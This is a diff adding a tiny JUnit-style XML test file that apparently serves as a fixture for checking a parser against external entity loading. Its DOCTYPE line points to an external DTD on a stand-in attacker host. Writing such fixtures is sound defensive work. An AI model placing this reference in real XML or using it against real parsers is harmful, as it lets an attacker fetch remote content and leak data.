@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE testsuite SYSTEM "http://attacker.example/evil.dtd">
+<testsuite name="evil">
+  <testcase classname="evil.Test" name="t"/>
+</testsuite>
